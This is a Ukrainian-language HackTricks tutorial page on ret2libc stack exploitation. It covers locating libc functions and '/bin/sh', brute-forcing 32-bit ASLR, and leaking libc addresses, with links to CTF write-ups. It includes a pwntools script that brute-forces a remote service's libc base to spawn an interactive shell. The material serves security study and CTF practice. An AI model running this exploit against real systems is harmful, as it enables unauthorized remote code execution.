# Ret2lib

{{#include ../../../../banners/hacktricks-training.md}}

## **Основна інформація**

Суть **Ret2Libc** полягає в перенаправленні потоку виконання вразливої програми до функції в загальній бібліотеці (наприклад, **system**, **execve**, **strcpy**) замість виконання shellcode, наданого атакуючим, в стеку. Атакуючий створює payload, який змінює адресу повернення в стеці, щоб вказати на потрібну функцію бібліотеки, одночасно забезпечуючи правильну настройку будь-яких необхідних аргументів відповідно до конвенції виклику.

### **Приклад кроків (спрощено)**

- Отримати адресу функції для виклику (наприклад, system) та команду для виклику (наприклад, /bin/sh)
- Згенерувати ROP-ланцюг для передачі першого аргументу, що вказує на рядок команди, та потоку виконання до функції

## Знаходження адрес

- Припустимо, що `libc`, що використовується, є тією, що на даній машині, ви можете знайти, де вона буде завантажена в пам'ять, за допомогою:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Якщо ви хочете перевірити, чи змінює ASLR адресу libc, ви можете зробити:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Знаючи використовувану libc, також можливо знайти зсув до функції `system` за допомогою:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Знаючи використовувану libc, також можливо знайти зсув до рядка `/bin/sh` функції за допомогою:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Використання gdb-peda / GEF

Знаючи використовувану libc, також можливо використовувати Peda або GEF, щоб отримати адреси функції **system**, функції **exit** та рядка **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Використання /proc/\<PID>/maps

Якщо процес створює **дочірні** процеси щоразу, коли ви з ним спілкуєтеся (мережевий сервер), спробуйте **прочитати** цей файл (можливо, вам знадобиться бути root).

Тут ви можете знайти **точно де завантажено libc** всередині процесу і **де воно буде завантажено** для кожного дочірнього процесу.

![](<../../../../images/image (95).png>)

У цьому випадку воно завантажено в **0xb75dc000** (Це буде базова адреса libc)

## Невідома libc

Можливо, ви **не знаєте, яку libc завантажує бінарник** (оскільки вона може бути розташована на сервері, до якого у вас немає доступу). У такому випадку ви можете зловживати вразливістю, щоб **витягнути деякі адреси і дізнатися, яка бібліотека libc** використовується:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

І ви можете знайти шаблон pwntools для цього в:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

## Обхід ASLR на 32 біт

Ці атаки методом перебору **корисні лише для 32-бітних систем**.

- Якщо експлойт локальний, ви можете спробувати методом перебору знайти базову адресу libc (корисно для 32-бітних систем):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Якщо ви атакуєте віддалений сервер, ви можете спробувати **вгадати адресу функції `libc` `usleep`**, передаючи в якості аргументу 10 (наприклад). Якщо в якийсь момент **сервер відповідає на 10 секунд довше**, ви знайшли адресу цієї функції.

## One Gadget

{{#ref}}
../../one-gadget.md
{{#endref}}

## x86 Ret2lib Code Example

У цьому прикладі брутфорс ASLR інтегровано в код, а вразливий бінарний файл розташований на віддаленому сервері:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Code Example

Перевірте приклад з:

{{#ref}}
../rop-return-oriented-programing.md
{{#endref}}

## Ret-into-printf (або puts)

Це дозволяє **витікати інформацію з процесу** шляхом виклику `printf`/`puts` з деякими специфічними даними, розміщеними як аргумент.

## Ret2printf

Це в основному означає зловживання **Ret2lib для перетворення його в уразливість форматних рядків `printf`** шляхом використання `ret2lib` для виклику printf з значеннями для експлуатації (звучить безглуздо, але можливо):

{{#ref}}
../../format-strings/
{{#endref}}

## Інші приклади та посилання

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, наданий витік адреси функції в libc, використовуючи один гаджет
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 біти, ASLR увімкнено, але без PIE, перший крок - заповнити переповнення до байта 0x00 канарки, щоб потім викликати puts і витікати його. З канаркою створюється ROP гаджет для виклику puts, щоб витікати адресу puts з GOT, а потім ROP гаджет для виклику `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 біти, ASLR увімкнено, без канарки, переповнення стеку в main з дочірньої функції. ROP гаджет для виклику puts, щоб витікати адресу puts з GOT, а потім виклик одного гаджета.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 біти, без pie, без канарки, без relro, nx. Використовує функцію write для витоку адреси write (libc) і викликає один гаджет.

{{#include ../../../../banners/hacktricks-training.md}}
